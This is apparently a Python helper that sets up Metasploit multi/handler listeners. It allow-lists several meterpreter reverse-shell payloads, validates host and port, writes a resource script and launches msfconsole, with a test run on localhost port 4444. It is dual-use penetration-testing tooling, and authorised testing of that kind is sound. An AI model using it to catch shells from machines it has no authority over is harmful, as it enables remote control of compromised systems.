import os
import subprocess
import tempfile
import logging
import ipaddress
import shutil
from pathlib import Path
from typing import Optional


class SecureListenerManager:
    
    def __init__(self):
        self.setup_logging()
        self.allowed_payloads = {
            'windows/meterpreter/reverse_tcp',
            'windows/x64/meterpreter/reverse_https',
            'android/meterpreter/reverse_tcp',
            'android/meterpreter/reverse_https',
            'linux/x64/meterpreter/reverse_tcp',
            'python/meterpreter/reverse_tcp',
            'osx/x64/shell_reverse_https'
        }
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('listener_manager.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def validate_ip_address(self, ip: str) -> bool:
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def validate_port(self, port: str) -> bool:
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except ValueError:
            return False
    
    def validate_payload(self, payload: str) -> bool:
        return payload in self.allowed_payloads
    
    def sanitize_input(self, user_input: str) -> str:
        dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>', '"', "'", '\\']
        sanitized = str(user_input)
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        return sanitized.strip()
    
    def create_secure_handler_config(self, payload: str, lhost: str, lport: str) -> Optional[str]:
        try:
            sanitized_payload = self.sanitize_input(payload)
            sanitized_lhost = self.sanitize_input(lhost)
            sanitized_lport = self.sanitize_input(lport)
            
            if not self.validate_payload(sanitized_payload):
                self.logger.error(f"Payload no válido: {sanitized_payload}")
                return None
            
            if not self.validate_ip_address(sanitized_lhost):
                self.logger.error(f"Dirección IP no válida: {sanitized_lhost}")
                return None
            
            if not self.validate_port(sanitized_lport):
                self.logger.error(f"Puerto no válido: {sanitized_lport}")
                return None
            
            config_content = f"""use exploit/multi/handler
set PAYLOAD {sanitized_payload}
set LHOST {sanitized_lhost}
set LPORT {sanitized_lport}
set ExitOnSession false
exploit -j
"""
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as temp_file:
                temp_file.write(config_content)
                config_path = temp_file.name
            
            os.chmod(config_path, 0o600)
            
            self.logger.info(f"Configuración de handler creada: {config_path}")
            print(f"Archivo de configuración generado correctamente")
            
            return config_path
            
        except Exception as e:
            self.logger.error(f"Error creando configuración de handler: {e}")
            return None
    
    def verify_msfconsole_available(self) -> bool:
        try:
            if not shutil.which('msfconsole'):
                self.logger.error("msfconsole no está disponible en el sistema")
                print("Error: msfconsole no encontrado. Instale Metasploit Framework")
                return False
            return True
        except Exception as e:
            self.logger.error(f"Error verificando msfconsole: {e}")
            return False
    
    def execute_msfconsole_securely(self, config_file: str) -> bool:
        try:
            if not os.path.exists(config_file):
                self.logger.error(f"Archivo de configuración no encontrado: {config_file}")
                return False
            
            if not self.verify_msfconsole_available():
                return False
            
            command = ["msfconsole", "-r", config_file]
            
            self.logger.info("Iniciando Metasploit con configuración segura")
            print("Iniciando Metasploit Framework...")
            
            result = subprocess.run(
                command,
                timeout=None,
                check=False
            )
            
            self.logger.info(f"msfconsole terminó con código: {result.returncode}")
            
            return result.returncode == 0
            
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error ejecutando msfconsole: {e}")
            print(f"Error ejecutando msfconsole: {e}")
            return False
        except KeyboardInterrupt:
            self.logger.info("msfconsole interrumpido por usuario")
            print("Operación interrumpida por el usuario")
            return False
        except Exception as e:
            self.logger.error(f"Error inesperado ejecutando msfconsole: {e}")
            print("Error inesperado durante la ejecución")
            return False
        finally:
            self.cleanup_config_file(config_file)
    
    def cleanup_config_file(self, config_file: str):
        try:
            if os.path.exists(config_file):
                os.remove(config_file)
                self.logger.info(f"Archivo temporal eliminado: {config_file}")
        except Exception as e:
            self.logger.warning(f"Error eliminando archivo temporal: {e}")
    
    def start_secure_listener(self, payload: str, lhost: str, lport: str) -> bool:
        try:
            self.logger.info(f"Iniciando listener seguro para {payload} en {lhost}:{lport}")
            
            config_file = self.create_secure_handler_config(payload, lhost, lport)
            if not config_file:
                print("Error creando configuración del listener")
                return False
            
            success = self.execute_msfconsole_securely(config_file)
            
            if success:
                self.logger.info("Listener iniciado exitosamente")
            else:
                self.logger.error("Error iniciando listener")
            
            return success
            
        except Exception as e:
            self.logger.error(f"Error en start_secure_listener: {e}")
            print("Error interno iniciando listener")
            return False
    
    def validate_and_start_listener(self, payload: str, lhost: str, lport: str) -> bool:
        try:
            if not payload or not lhost or not lport:
                print("Error: Todos los parámetros son requeridos")
                return False
            
            print(f"Validando configuración del listener...")
            print(f"Payload: {payload}")
            print(f"Host: {lhost}")
            print(f"Puerto: {lport}")
            
            return self.start_secure_listener(payload, lhost, lport)
            
        except Exception as e:
            self.logger.error(f"Error validando listener: {e}")
            return False


listener_manager = SecureListenerManager()


def crear_handler_rc(payload: str, lhost: str, lport: str, archivo: str = None):
    config_file = listener_manager.create_secure_handler_config(payload, lhost, lport)
    return config_file is not None


def lanzar_msfconsole(handler_rc: str = None):
    if handler_rc and os.path.exists(handler_rc):
        return listener_manager.execute_msfconsole_securely(handler_rc)
    else:
        print("Error: Archivo de configuración no válido")
        return False


def listener_main(payload: str, lhost: str, lport: str):
    return listener_manager.validate_and_start_listener(payload, lhost, lport)


if __name__ == "__main__":
    payload_test = "windows/meterpreter/reverse_tcp"
    lhost_test = "127.0.0.1"
    lport_test = "4444"
    
    print("Iniciando listener de prueba...")
    success = listener_main(payload_test, lhost_test, lport_test)
    
    if success:
        print("Listener iniciado correctamente")
    else:
        print("Error iniciando listener")